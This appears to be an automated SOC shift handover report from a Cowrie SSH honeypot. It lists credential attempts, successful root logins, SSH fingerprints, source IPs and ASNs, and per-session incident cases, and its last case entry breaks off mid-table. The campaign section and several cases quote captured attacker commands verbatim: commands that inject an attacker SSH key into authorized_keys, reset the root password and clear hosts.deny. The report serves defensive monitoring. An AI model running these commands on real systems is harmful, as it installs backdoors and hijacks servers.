# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-09 |
| **Generated At** | 2026-05-09T22:52:18Z |
| **Shift Time** | 22:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **281** |
| Confirmed Threats | **266** |
| False Positives Filtered | **15** (5.3%) |
| Unique Attacker IPs | **29** |
| Countries of Origin | **18** |
| High Severity Cases | **16** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **265** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **92** |
| Unique Credential Pairs | **50** |
| Unique Usernames | **27** |
| Unique Passwords | **49** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 22 |
| `root` | 16 |
| `345gs5662d34` | 9 |
| `postgres` | 4 |
| `oracle` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 9 |
| `3245gs5662d34` | 7 |
| `123#@!` | 2 |
| `git12345678` | 2 |
| `Admin123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 9 |
| `root` | `3245gs5662d34` | 7 |
| `ubuntu` | `123#@!` | 2 |
| `ubuntu` | `git12345678` | 2 |
| `ubuntu` | `Admin123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `vps1234` | `103.84.236.222` | 2026-05-09T21:00:30 |
| `root` | `3245gs5662d34` | `103.84.236.222` | 2026-05-09T21:00:32 |
| `root` | `server123456789` | `77.237.234.238` | 2026-05-09T21:05:32 |
| `root` | `3245gs5662d34` | `77.237.234.238` | 2026-05-09T21:05:37 |
| `root` | `admin66` | `103.84.236.222` | 2026-05-09T21:05:49 |
| `root` | `admin66` | `77.237.234.238` | 2026-05-09T21:06:32 |
| `root` | `vps1234` | `77.237.234.238` | 2026-05-09T21:15:36 |
| `root` | `server123456789` | `103.84.236.222` | 2026-05-09T21:15:41 |
| `root` | `admin2024@` | `138.197.200.106` | 2026-05-09T22:05:56 |
| `root` | `admin_2024` | `138.197.200.106` | 2026-05-09T22:14:02 |
| `root` | `3245gs5662d34` | `138.197.200.106` | 2026-05-09T22:14:11 |
| `root` | `admin#2023` | `138.197.200.106` | 2026-05-09T22:24:10 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **281** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 95 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 92 | 3 |
| `14b2ddda386a...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 92 | 3 | libssh-based |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `14b2ddda386a...` | libssh | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Jg7fMQBx7ymB"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `138.197.200.106`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.84.236.222`, `138.197.200.106`, `77.237.234.238`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **29** |
| Unique ASNs | **24** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 2 | LOW |
| `AS209334` | Modat B.V. | 2 | HIGH |
| `AS36884` | Wana Corporate | 2 | LOW |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS213412` | ONYPHE SAS | 1 | HIGH |
| `AS266416` | L3 NETWORKS E TELECOMUNICACOES LTDA | 1 | LOW |
| `AS134945` | Blue Sky Broadband Pvt. Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (16)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2614859d790f

| Field | Detail |
|---|---|
| **Source IP** | `103.84.236[.]222` |
| **First Seen** | 2026-05-09 21:00 |
| **Last Seen** | 2026-05-09 21:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 21:00:30` | `cowrie.session.connect` |
| `2026-05-09 21:00:30` | `cowrie.client.version` |
| `2026-05-09 21:00:30` | `cowrie.client.kex` |
| `2026-05-09 21:00:30` | `cowrie.login.success` |
| `2026-05-09 21:00:30` | `cowrie.session.params` |
| `2026-05-09 21:00:30` | `cowrie.command.input` |
| `2026-05-09 21:00:30` | `cowrie.command.failed` |
| `2026-05-09 21:00:30` | `cowrie.log.closed` |
| `2026-05-09 21:00:30` | `cowrie.session.params` |
| `2026-05-09 21:00:30` | `cowrie.command.input` |
| `2026-05-09 21:00:30` | `cowrie.session.file_download` |
| `2026-05-09 21:00:30` | `cowrie.log.closed` |
| `2026-05-09 21:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.84.236[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.84.236[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c06c4814319c

| Field | Detail |
|---|---|
| **Source IP** | `103.84.236[.]222` |
| **First Seen** | 2026-05-09 21:00 |
| **Last Seen** | 2026-05-09 21:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 21:00:31` | `cowrie.session.connect` |
| `2026-05-09 21:00:31` | `cowrie.client.version` |
| `2026-05-09 21:00:32` | `cowrie.client.kex` |
| `2026-05-09 21:00:32` | `cowrie.login.success` |
| `2026-05-09 21:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.84.236[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.84.236[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46f570ee53dc

| Field | Detail |
|---|---|
| **Source IP** | `77.237.234[.]238` |
| **First Seen** | 2026-05-09 21:05 |
| **Last Seen** | 2026-05-09 21:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 21:05:32` | `cowrie.session.connect` |
| `2026-05-09 21:05:32` | `cowrie.client.version` |
| `2026-05-09 21:05:32` | `cowrie.client.kex` |
| `2026-05-09 21:05:32` | `cowrie.login.success` |
| `2026-05-09 21:05:33` | `cowrie.session.params` |
| `2026-05-09 21:05:33` | `cowrie.command.input` |
| `2026-05-09 21:05:33` | `cowrie.command.failed` |
| `2026-05-09 21:05:33` | `cowrie.log.closed` |
| `2026-05-09 21:05:33` | `cowrie.session.params` |
| `2026-05-09 21:05:33` | `cowrie.command.input` |
| `2026-05-09 21:05:33` | `cowrie.session.file_download` |
| `2026-05-09 21:05:33` | `cowrie.log.closed` |
| `2026-05-09 21:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.237.234[.]238` to AbuseIPDB if not already reported
- [ ] Block `77.237.234[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b690a22d52d8

| Field | Detail |
|---|---|
| **Source IP** | `77.237.234[.]238` |
| **First Seen** | 2026-05-09 21:05 |
| **Last Seen** | 2026-05-09 21:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 21:05:35` | `cowrie.session.connect` |
| `2026-05-09 21:05:35` | `cowrie.client.version` |
| `2026-05-09 21:05:36` | `cowrie.client.kex` |
| `2026-05-09 21:05:37` | `cowrie.login.success` |
| `2026-05-09 21:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.237.234[.]238` to AbuseIPDB if not already reported
- [ ] Block `77.237.234[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a05eb4a7a08c

| Field | Detail |
|---|---|
| **Source IP** | `103.84.236[.]222` |
| **First Seen** | 2026-05-09 21:05 |
| **Last Seen** | 2026-05-09 21:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 21:05:49` | `cowrie.session.connect` |
| `2026-05-09 21:05:49` | `cowrie.client.version` |
| `2026-05-09 21:05:49` | `cowrie.client.kex` |
| `2026-05-09 21:05:49` | `cowrie.login.success` |
| `2026-05-09 21:05:49` | `cowrie.session.params` |
| `2026-05-09 21:05:49` | `cowrie.command.input` |
| `2026-05-09 21:05:49` | `cowrie.command.failed` |
| `2026-05-09 21:05:49` | `cowrie.log.closed` |
| `2026-05-09 21:05:50` | `cowrie.session.params` |
| `2026-05-09 21:05:50` | `cowrie.command.input` |
| `2026-05-09 21:05:50` | `cowrie.session.file_download` |
| `2026-05-09 21:05:50` | `cowrie.log.closed` |
| `2026-05-09 21:05:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.84.236[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.84.236[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91d189d1912f

| Field | Detail |
|---|---|
| **Source IP** | `103.84.236[.]222` |
| **First Seen** | 2026-05-09 21:05 |
| **Last Seen** | 2026-05-09 21:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 21:05:51` | `cowrie.session.connect` |
| `2026-05-09 21:05:51` | `cowrie.client.version` |
| `2026-05-09 21:05:51` | `cowrie.client.kex` |
| `2026-05-09 21:05:51` | `cowrie.login.success` |
| `2026-05-09 21:05:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.84.236[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.84.236[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d812ef353278

| Field | Detail |
|---|---|
| **Source IP** | `77.237.234[.]238` |
| **First Seen** | 2026-05-09 21:06 |
| **Last Seen** | 2026-05-09 21:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 21:06:32` | `cowrie.session.connect` |
| `2026-05-09 21:06:32` | `cowrie.client.version` |
| `2026-05-09 21:06:32` | `cowrie.client.kex` |
| `2026-05-09 21:06:32` | `cowrie.login.success` |
| `2026-05-09 21:06:33` | `cowrie.session.params` |
| `2026-05-09 21:06:33` | `cowrie.command.input` |
| `2026-05-09 21:06:33` | `cowrie.command.failed` |
| `2026-05-09 21:06:33` | `cowrie.log.closed` |
| `2026-05-09 21:06:33` | `cowrie.session.params` |
| `2026-05-09 21:06:33` | `cowrie.command.input` |
| `2026-05-09 21:06:33` | `cowrie.session.file_download` |
| `2026-05-09 21:06:33` | `cowrie.log.closed` |
| `2026-05-09 21:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.237.234[.]238` to AbuseIPDB if not already reported
- [ ] Block `77.237.234[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad0c5c786479

| Field | Detail |
|---|---|
| **Source IP** | `77.237.234[.]238` |
| **First Seen** | 2026-05-09 21:06 |
| **Last Seen** | 2026-05-09 21:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 21:06:36` | `cowrie.session.connect` |
| `2026-05-09 21:06:36` | `cowrie.client.version` |
| `2026-05-09 21:06:36` | `cowrie.client.kex` |
| `2026-05-09 21:06:37` | `cowrie.login.success` |
| `2026-05-09 21:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.237.234[.]238` to AbuseIPDB if not already reported
- [ ] Block `77.237.234[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d8a93432a0b

| Field | Detail |
|---|---|
| **Source IP** | `77.237.234[.]238` |
| **First Seen** | 2026-05-09 21:15 |
| **Last Seen** | 2026-05-09 21:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 21:15:36` | `cowrie.session.connect` |
| `2026-05-09 21:15:36` | `cowrie.client.version` |
| `2026-05-09 21:15:36` | `cowrie.client.kex` |
| `2026-05-09 21:15:36` | `cowrie.login.success` |
| `2026-05-09 21:15:37` | `cowrie.session.params` |
| `2026-05-09 21:15:37` | `cowrie.command.input` |
| `2026-05-09 21:15:37` | `cowrie.command.failed` |
| `2026-05-09 21:15:37` | `cowrie.log.closed` |
| `2026-05-09 21:15:37` | `cowrie.session.params` |
| `2026-05-09 21:15:37` | `cowrie.command.input` |
| `2026-05-09 21:15:37` | `cowrie.session.file_download` |
| `2026-05-09 21:15:37` | `cowrie.log.closed` |
| `2026-05-09 21:15:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.237.234[.]238` to AbuseIPDB if not already reported
- [ ] Block `77.237.234[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d8afd41d00c

| Field | Detail |
|---|---|
| **Source IP** | `77.237.234[.]238` |
| **First Seen** | 2026-05-09 21:15 |
| **Last Seen** | 2026-05-09 21:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 21:15:39` | `cowrie.session.connect` |
| `2026-05-09 21:15:39` | `cowrie.client.version` |
| `2026-05-09 21:15:39` | `cowrie.client.kex` |
| `2026-05-09 21:15:40` | `cowrie.login.success` |
| `2026-05-09 21:15:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.237.234[.]238` to AbuseIPDB if not already reported
- [ ] Block `77.237.234[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-018a3afdcbea

| Field | Detail |
|---|---|
| **Source IP** | `103.84.236[.]222` |
| **First Seen** | 2026-05-09 21:15 |
| **Last Seen** | 2026-05-09 21:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 21:15:41` | `cowrie.session.connect` |
| `2026-05-09 21:15:41` | `cowrie.client.version` |
| `2026-05-09 21:15:41` | `cowrie.client.kex` |
| `2026-05-09 21:15:41` | `cowrie.login.success` |
| `2026-05-09 21:15:41` | `cowrie.session.params` |
| `2026-05-09 21:15:41` | `cowrie.command.input` |
| `2026-05-09 21:15:41` | `cowrie.command.failed` |
| `2026-05-09 21:15:41` | `cowrie.log.closed` |
| `2026-05-09 21:15:41` | `cowrie.session.params` |
| `2026-05-09 21:15:41` | `cowrie.command.input` |
| `2026-05-09 21:15:42` | `cowrie.session.file_download` |
| `2026-05-09 21:15:42` | `cowrie.log.closed` |
| `2026-05-09 21:15:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.84.236[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.84.236[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6204e421d79a

| Field | Detail |
|---|---|
| **Source IP** | `103.84.236[.]222` |
| **First Seen** | 2026-05-09 21:15 |
| **Last Seen** | 2026-05-09 21:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 21:15:43` | `cowrie.session.connect` |
| `2026-05-09 21:15:43` | `cowrie.client.version` |
| `2026-05-09 21:15:43` | `cowrie.client.kex` |
| `2026-05-09 21:15:43` | `cowrie.login.success` |
| `2026-05-09 21:15:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.84.236[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.84.236[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58ae217e544d

| Field | Detail |
|---|---|
| **Source IP** | `138.197.200[.]106` |
| **First Seen** | 2026-05-09 22:05 |
| **Last Seen** | 2026-05-09 22:06 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
